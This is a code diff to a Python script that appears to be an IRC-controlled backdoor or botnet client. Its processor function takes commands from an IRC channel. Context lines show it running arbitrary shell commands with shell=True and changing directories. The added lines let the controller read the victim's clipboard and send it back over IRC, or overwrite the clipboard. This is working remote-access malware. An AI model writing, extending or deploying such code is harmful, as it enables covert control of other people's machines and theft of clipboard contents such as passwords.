@@ -3,6 +3,7 @@ from cryptography import fernet
 from os import getcwd, chdir
 from subprocess import check_output,STDOUT
 from time import sleep
+from clipboard import paste , copy
 def clearBuffer(sock,time):
     sock.settimeout(time)
     while 1:
@@ -36,6 +37,12 @@ def processor(irc , server , channel , port , key , botnick):
                     if path:
                         chdir(path)
                         send(irc, "DONE :)")
+                elif "wclipboard" in text:
+                    text=text.strip().replace("CMD:", "").replace("wclipboard ", "")
+                    copy(text)
+                    send(irc, "DONE :)")
+                elif "rclipboard" in text :
+                    send(irc, paste())
                 elif "CMD:" in text :
                     out=check_output(text.split("CMD:")[-1],stderr=STDOUT,shell=True)
                     send(irc, out.decode())
